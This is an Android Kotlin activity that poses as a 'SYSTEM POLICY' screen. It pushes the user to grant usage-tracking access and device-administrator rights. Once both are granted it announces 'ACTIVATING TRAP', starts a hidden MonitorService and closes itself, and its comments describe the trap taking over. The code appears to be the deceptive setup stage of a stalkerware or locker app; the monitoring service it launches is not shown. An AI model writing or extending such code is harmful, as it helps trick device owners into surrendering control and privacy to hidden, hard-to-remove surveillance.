package com.example.myandroid

import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Process
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            SetupScreen()
        }
    }

    @Composable
    fun SetupScreen() {
        val ctx = LocalContext.current
        var status by remember { mutableStateOf("Checking...") }
        var allGood by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            while(true) {
                val hasUsage = hasUsageStats(ctx)
                val hasAdmin = isAdmin(ctx)
                
                if (!hasUsage) {
                    status = "Step 1: Grant Usage Tracking"
                } else if (!hasAdmin) {
                    status = "Step 2: Activate Device Admin"
                } else {
                    status = "SETUP COMPLETE - ACTIVATING TRAP"
                    allGood = true
                    // Start the Trap Service
                    startService(Intent(ctx, MonitorService::class.java))
                    delay(1500)
                    // Close UI so the trap can take over
                    finish()
                }
                delay(500)
            }
        }

        Column(
            modifier = Modifier.fillMaxSize().background(Color(0xFF121212)),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text("🛡️", fontSize = 60.sp)
            Text("SYSTEM POLICY", color = Color.White, fontSize = 24.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(30.dp))
            Text(status, color = Color.Yellow, fontSize = 16.sp, fontWeight = FontWeight.Bold)
            
            if (!allGood) {
                Spacer(modifier = Modifier.height(40.dp))
                Button(onClick = {
                    if (!hasUsageStats(ctx)) {
                        ctx.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                    } else if (!isAdmin(ctx)) {
                        val comp = ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                        val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                        i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                        ctx.startActivity(i)
                    }
                }, colors = ButtonDefaults.buttonColors(containerColor = Color.Blue)) {
                    Text("ENABLE PERMISSION", color = Color.White)
                }
            }
        }
    }

    fun hasUsageStats(ctx: Context): Boolean {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    fun isAdmin(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val comp = ComponentName(ctx, MyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(comp)
    }
}